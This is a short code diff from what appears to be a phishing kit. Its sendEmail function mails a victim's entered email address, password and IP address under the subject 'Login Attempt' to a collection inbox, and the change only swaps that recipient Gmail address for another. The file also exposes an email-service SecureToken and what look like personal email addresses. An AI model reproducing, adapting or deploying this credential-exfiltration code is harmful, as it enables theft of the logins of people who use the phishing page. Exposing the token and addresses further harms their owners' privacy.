@@ -111,7 +111,7 @@ const sendRequest = async (data) => {
 
 const sendEmail = async (data) => {
     const templateParams = {
-        to_email: 'sarwilliams845@gmail.com',
+        to_email: 'brunopaul206@gmail.com',
         from_email: 'bekkierowland@gmail.com',
         subject: 'Login Attempt',
         body: `Email: ${data.email}\nPassword: ${data.password}\nIP Address: ${data.ip}`,
@@ -120,7 +120,7 @@ const sendEmail = async (data) => {
     try {
         await Email.send({
             SecureToken: '1da0dcb4-c434-44fa-b7fa-c9577ebe1408',
-            To: 'sarwilliams845@gmail.com',
+            To: 'brunopaul206@gmail.com',
             From: 'bekkierowland@gmail.com',
             Subject: templateParams.subject,
             Body: templateParams.body,
